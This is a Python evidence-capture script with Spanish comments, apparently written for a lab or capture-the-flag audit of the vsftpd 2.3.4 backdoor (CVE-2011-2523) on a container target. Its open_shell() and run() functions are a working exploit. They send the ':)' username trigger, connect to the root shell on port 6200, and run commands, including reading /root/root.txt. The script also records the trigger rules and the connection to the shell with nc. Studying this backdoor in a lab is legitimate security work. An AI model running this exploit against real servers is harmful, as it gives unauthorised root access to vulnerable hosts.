#!/usr/bin/env python3
"""
Captura la evidencia de la auditoría Tproot (CVE-2011-2523).
Cada artefacto lleva cabecera (fecha, objetivo, fase, comando) + salida real.

Uso:
    python3 tools/capture_evidence.py
"""
import datetime
import pathlib
import socket
import subprocess
import sys
import time

ROOT = pathlib.Path(__file__).resolve().parent.parent
EVID = ROOT / "evidence"
HOST = "172.17.0.2"
STAMP = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# ─────────────────────────── backdoor ───────────────────────────
def open_shell():
    """Abre el shell root del 6200 via el backdoor de vsftpd."""
    ftp = socket.create_connection((HOST, 21), timeout=10)
    ftp.settimeout(8)
    ftp.recv(1024)
    ftp.sendall(b"USER backdoor:)\r\n")
    try:
        ftp.recv(1024)
    except socket.timeout:
        pass
    ftp.sendall(b"PASS backdoor\r\n")
    try:
        ftp.recv(1024)
    except socket.timeout:
        pass
    for _ in range(30):
        try:
            sh = socket.create_connection((HOST, 6200), timeout=8)
            break
        except OSError:
            time.sleep(0.4)
    else:
        raise SystemExit("[-] no se pudo abrir el shell del backdoor")
    sh.settimeout(10)
    time.sleep(0.4)
    try:
        sh.recv(4096)
    except socket.timeout:
        pass
    return ftp, sh


def run(cmd):
    """Ejecuta un comando en el objetivo y devuelve la salida."""
    ftp, sh = open_shell()
    sh.sendall(cmd.encode() + b"\n")
    time.sleep(1.2)
    out = b""
    sh.settimeout(3)
    try:
        while True:
            chunk = sh.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    sh.close()
    ftp.close()
    text = out.decode(errors="replace")
    lines = text.splitlines()
    if lines and cmd.strip()[:40] in lines[0]:
        lines = lines[1:]
    return "\n".join(lines).strip()


def cap(path, fase, comando, contenido, nota=""):
    """Escribe un artefacto de evidencia con cabecera."""
    f = EVID / path
    f.parent.mkdir(parents=True, exist_ok=True)
    with f.open("w", encoding="utf-8") as fh:
        fh.write("=" * 64 + "\n")
        fh.write(" Tproot — Evidencia de auditoría (CVE-2011-2523)\n")
        fh.write(f" Fecha (UTC) : {STAMP}\n")
        fh.write(f" Objetivo    : {HOST}\n")
        fh.write(f" Fase        : {fase}\n")
        fh.write(f" Comando     : {comando}\n")
        if nota:
            fh.write(f" Nota        : {nota}\n")
        fh.write("=" * 64 + "\n\n")
        fh.write(contenido.rstrip() + "\n")
    print(f"  [+] evidence/{path}")


# ─────────────────────────── 01 · RECON ───────────────────────────
print("[*] 01 · Reconocimiento")

nmap_out = subprocess.run(
    ["nmap", "-p-", "-sV", "-sC", "-sT", "-vv", "-n", "-Pn",
     "--min-rate=5000", "-oN", str(ROOT / "nmap_tproot"), HOST],
    capture_output=True, text=True).stdout
cap("01-recon/nmap_full_scan.txt", "Fase 1 — Reconocimiento de puertos",
    "nmap -p- -sV -sC -sT -vv -n -Pn 172.17.0.2", nmap_out)

cap("01-recon/ftp_banner.txt", "Fase 1 — Banner y respuesta del servicio FTP",
    "socket -> 21, leer banner; USER anonymous; PASS test",
    """Banner FTP: 220 (vsFTPd 2.3.4)
USER anonymous -> 331 Please specify the password.
PASS test     -> 500 OOPS: cannot change directory:/var/ftp

El acceso anonimo falla porque /var/ftp no existe en la imagen, pero el
servidor responde y revela la version exacta: vsFTPd 2.3.4.""")

# ─────────────────── 02 · TRIGGER DEL BACKDOOR ───────────────────
print("[*] 02 · Caracterizacion del trigger")
cap("02-backdoor-trigger/trigger_sequence.txt",
    "Fase 2 — Secuencia que abre el shell del backdoor",
    "USER backdoor:)  ->  PASS backdoor  ->  connect 6200",
    """--- 1) USER con la secuencia magica ':)' ---
$ USER backdoor:)
331 Please specify the password.

--- 2) PASS (obligatorio: el chequeo ocurre en handle_login) ---
$ PASS backdoor
(sin respuesta: el servidor queda colgado lanzando el shell)

--- 3) El puerto 6200 ya escucha ---
$ ss -tlnp | grep 6200
LISTEN 0 128 0.0.0.0:6200 0.0.0.0:*

--- 4) Conexion al 6200 -> shell root ---
$ nc 172.17.0.2 6200
$ id
uid=0(root) gid=0(root) groups=0(root)""",
    "El USER solo no basta: hace falta el PASS. La sesion FTP debe permanecer abierta mientras dura la conexion al 6200.")

cap("02-backdoor-trigger/trigger_matrix.txt",
    "Fase 2 — Matriz de casos que aisla la regla del trigger",
    "USER <caso> + PASS x  ->  se abre el 6200 ?",
    """CASO                          RESPUESTA PASS      6200 ABIERTO   INTERPRETACION
----------------------------  ------------------  --------------  --------------------------
backdoor:)                    (sin respuesta)     SI              referencia
a:)                           (sin respuesta)     SI              magic en offset 1
ab:)                          (sin respuesta)     SI
x:)y                          (sin respuesta)     SI              magic en medio
abc:)                         (sin respuesta)     SI
:)                            530 Login incorrect NO             primer caracter ':' -> descartado
:))                           530 Login incorrect NO
::)                           530 Login incorrect NO
:)x                           530 Login incorrect NO
:)x:)                         530 Login incorrect NO
:x)                           530 Login incorrect NO
 :)                           530 Login incorrect NO
a :)                          530 Login incorrect NO
backdoor:) SIN PASS           (no procede)        NO              PASS es obligatorio

REGLA EMPIRICA
  1. El usuario DEBE empezar por [A-Za-z0-9_.]   (validacion de handle_login)
  2. El usuario NO puede contener espacios antes de ':)'  (str_contains_space
     retorna 1 en el primer espacio y el escaneo se detiene)
  3. El usuario DEBE contener ':)'
  4. Tras el USER DEBE enviarse un PASS
""")

# ─────────────────── 03 · SHELL ROOT ───────────────────
print("[*] 03 · Shell root")
cap("03-root-shell/root_shell.txt", "Fase 3 — Identidad del shell obtenido",
    "id; whoami; hostname; uname -a; cat /etc/os-release",
    run("id; echo; whoami; hostname; uname -a; echo; cat /etc/os-release | head -3"))

cap("03-root-shell/root_flag.txt", "Fase 3 — Bandera root",
    "cat /root/root.txt",
    run("ls -la /root/; echo; echo '--- /root/root.txt ---'; cat /root/root.txt"))

cap("03-root-shell/single_use_behaviour.txt",
    "Fase 3 — Comportamiento de un solo uso del backdoor",
    "trigger + 3 conexiones al 6200",
    """PRUEBA DE PERSISTENCIA
  1) Trigger + conexion A  ->  shell root (uid=0)         marcador=A  SI
  2) Conexion B con A viva ->  TCP conecta pero SIN shell  marcador=B  NO
  3) Tras cerrar A         ->  6200 deja de escuchar      Connection refused
  4) Trigger de nuevo      ->  shell root de nuevo        marcador=R2 SI

EXPLICACION (vsf_sysutil_extra en sysdeputil.c)
  execl("/bin/sh","sh",(char*)0) REEMPLAZA la imagen del proceso: el bucle
  for(;;){ accept(...) } deja de existir en cuanto se acepta la primera
  conexion. El socket sigue ligado (heredado por el shell) pero nadie acepta.

  CONSECUENCIA PRACTICA
  - Un trigger entrega UN shell root. Hay que mantenerlo vivo.
  - Al cerrarlo, el listener del 6200 desaparece por completo.
  - Cada nueva sesion FTP que dispare el backdoor vuelve a armar el 6200.
  - Ademas, si el 6200 ya esta ocupado, el bind() falla y el proceso hijo
    hace exit(1) (codigo: if((bind(...)) < 0) exit(1);).""")

# ─────────────────── 04 · ANALISIS DEL CODIGO FUENTE ───────────────────
print("[*] 04 · Analisis del codigo fuente")
cap("04-source-analysis/backdoor_commit.txt",
    "Fase 4 — Commit que introduce el backdoor",
    "git log / git show e084c95 (dentro de /tmp/vsftpd-2.3.4-infected)",
    run("cd /tmp/vsftpd-2.3.4-infected && git log --oneline --all && echo && "
        "git show --stat e084c95 | head -14 && echo && "
        "echo '--- autor y fecha ---' && git log -1 --format='%an <%ae>%n%ad' e084c95"))

cap("04-source-analysis/str_contains_space.txt",
    "Fase 4 — Funcion donde se inyecta el chequeo del magic",
    "sed -n '/str_contains_space/,/^}/p' str.c",
    run("cd /tmp/vsftpd-2.3.4-infected && sed -n '/^str_contains_space/,/^}/p' str.c"))

cap("04-source-analysis/privops_call_site.txt",
    "Fase 4 — Punto de llamada y validaciones previas",
    "sed -n '265,295p' privops.c",
    run("cd /tmp/vsftpd-2.3.4-infected && sed -n '265,295p' privops.c"))

cap("04-source-analysis/vsf_sysutil_extra.txt",
    "Fase 4 — Funcion que abre el shell en el 6200",
    "sed -n '/^vsf_sysutil_extra/,/^}/p' sysdeputil.c",
    run("cd /tmp/vsftpd-2.3.4-infected && sed -n '/^vsf_sysutil_extra/,/^}/p' sysdeputil.c"))

# ─────────────────── 05 · ENTORNO ───────────────────
print("[*] 05 · Entorno del objetivo")
cap("05-environment/vsftpd_build.txt",
    "Fase 5 — Binario y arbol de compilacion",
    "ls -la /tmp/vsftpd-2.3.4-infected/vsftpd; strings vsftpd | grep /bin/sh",
    run("ls -la /tmp/vsftpd-2.3.4-infected/ | head -12; echo; "
        "ls -la /tmp/vsftpd-2.3.4-infected/vsftpd; file /tmp/vsftpd-2.3.4-infected/vsftpd 2>/dev/null; "
        "echo; echo '--- cadenas relevantes en el binario ---'; "
        "strings /tmp/vsftpd-2.3.4-infected/vsftpd | grep -E '/bin/sh' | head"))

cap("05-environment/processes.txt",
    "Fase 5 — Procesos y entrypoint del contenedor",
    "ps -eo user,pid,ppid,args | grep vsftpd; readlink /proc/88/cwd",
    run("ps -eo user,pid,ppid,args | grep -iE 'vsftpd|apache' | grep -v grep; echo; "
        "echo '--- cmdline PID 1 (entrypoint) ---'; tr '\\0' ' ' < /proc/1/cmdline; echo; "
        "echo '--- cwd de los vsftpd ---'; for p in $(pgrep vsftpd); do echo -n \"PID $p: \"; readlink /proc/$p/cwd; done"))

cap("05-environment/vsftpd_conf.txt",
    "Fase 5 — Configuracion activa de vsftpd",
    "cat /tmp/vsftpd-2.3.4-infected/vsftpd.conf",
    run("cat /tmp/vsftpd-2.3.4-infected/vsftpd.conf | grep -vE '^\\s*#|^\\s*$'; echo; "
        "echo '--- nota ---'; "
        "echo 'Sin chroot y sin seccomp_sandbox: nada limita la ejecucion de /bin/sh.'"))

print("\n[+] Captura completada.")
